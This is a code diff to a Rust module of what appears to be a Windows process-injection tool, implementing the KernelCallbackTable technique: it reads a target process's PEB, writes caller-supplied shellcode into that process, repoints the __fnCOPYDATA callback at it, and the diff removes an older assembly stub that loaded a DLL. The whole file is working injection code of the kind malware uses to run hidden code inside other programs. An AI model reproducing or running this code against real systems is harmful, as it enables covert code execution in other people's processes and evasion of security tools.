@@ -1,7 +1,8 @@
+#[allow(unused_variables)]
+
 use std::ffi::c_void;
 
-use windows::{Wdk::System::Threading::ProcessBasicInformation, Win32::{Foundation::{LPARAM, WPARAM}, System::{DataExchange::COPYDATASTRUCT, Threading::{PEB, PROCESS_BASIC_INFORMATION}}, UI::WindowsAndMessaging::WM_COPYDATA}};
-use dynasmrt::{dynasm, DynasmApi};
+use windows::{Wdk::System::Threading::ProcessBasicInformation, Win32::{Foundation::{LPARAM, WPARAM}, System::{DataExchange::COPYDATASTRUCT, Threading::PROCESS_BASIC_INFORMATION}, UI::WindowsAndMessaging::WM_COPYDATA}};
 use crate::{utils::to_wide, wrappers::{HandleWrapper as _, RemoteAllocator as _, RemoteProcess}};
 
 use super::ExecutionMethod;
@@ -12,6 +13,7 @@ pub struct PebPartial {
     pub kernel_callback_table: *mut c_void,
 }
 
+#[allow(non_snake_case)]
 #[repr(C)]
 #[derive(Debug, Clone, Copy)]
 pub struct KernelCallbackTable {
@@ -150,8 +152,7 @@ pub struct KernelCallbackTableExecutor;
 impl ExecutionMethod for KernelCallbackTableExecutor {
     fn execute(
         remote_process: &RemoteProcess,
-        inject_func_addr: usize,
-        dll_path_malloc: *mut c_void,
+        shellcode_to_exec: &Vec<u8>,
     ) -> Result<(), Box<dyn std::error::Error>> {
         let pbi = remote_process.query_info::<PROCESS_BASIC_INFORMATION>(ProcessBasicInformation)?;
 
@@ -167,12 +168,8 @@ impl ExecutionMethod for KernelCallbackTableExecutor {
 
         println!("KernelCallbackTable: {:?}", kct);
 
-        let stub = build_shcode(
-            dll_path_malloc as u64,
-            inject_func_addr as u64,
-        )?;
-        let shellcode_mem = remote_process.alloc(stub.len(), true)?;
-        remote_process.write(shellcode_mem, &stub)?;
+        let shellcode_mem = remote_process.alloc(shellcode_to_exec.len(), true)?;
+        remote_process.write(shellcode_mem, &shellcode_to_exec)?;
 
         kct.__fnCOPYDATA = shellcode_mem as usize;
         let newkct_addr = remote_process.alloc(std::mem::size_of::<KernelCallbackTable>(), true)?;
@@ -222,28 +219,4 @@ impl ExecutionMethod for KernelCallbackTableExecutor {
 
         Ok(())
     }
-}
-
-fn build_shcode(
-    dll_path_ptr: u64,
-    inject_func_ptr: u64,
-) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
-    let mut ops: dynasmrt::Assembler<dynasmrt::x64::X64Relocation> = dynasmrt::x64::Assembler::new()?;
-
-    dynasm!(ops
-        ; .arch x64
-        ; sub rsp, 0x28
-
-        ; mov rcx, QWORD dll_path_ptr as i64  // inject
-        ; mov rax, QWORD inject_func_ptr as i64
-        ; call rax
-
-        ; add rsp, 0x28
-
-        ; ret
-    );
-
-    let buf = ops.finalize().unwrap();
-    println!("{:#04X?}, length: {}", buf.to_vec(), buf.to_vec().len());
-    Ok(buf.to_vec())
 }
